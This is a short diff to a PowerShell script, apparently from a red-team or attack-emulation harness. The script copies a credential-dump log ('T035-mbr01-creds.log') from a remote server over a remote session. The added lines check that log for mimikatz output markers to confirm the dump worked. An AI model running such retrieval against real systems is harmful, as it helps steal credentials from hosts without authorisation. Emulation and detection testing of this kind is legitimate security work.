@@ -45,6 +45,13 @@ $sess = New-PSSession -ComputerName $Server -Credential $cred -Port 5985 -ErrorA
 try {
     Copy-Item -Path $OutFile -Destination "C:\Tools\cadre-attack\T035-mbr01-creds.log" -FromSession $sess -Force
     Write-Output "PULLED: $OutFile -> C:\Tools\cadre-attack\T035-mbr01-creds.log"
+    $log = Get-Content "C:\Tools\cadre-attack\T035-mbr01-creds.log" -ErrorAction SilentlyContinue
+    if ($log -match 'NT AUTHORITY|mimikatz|Authentication Id|SID:') {
+        Write-Output "T035_CREDS_OK"
+    } else {
+        Write-Output "T035_CREDS_FAIL: pulled log had no dump proof"
+        exit 1
+    }
 } finally {
     Remove-PSSession -Session $sess -ErrorAction SilentlyContinue
 }
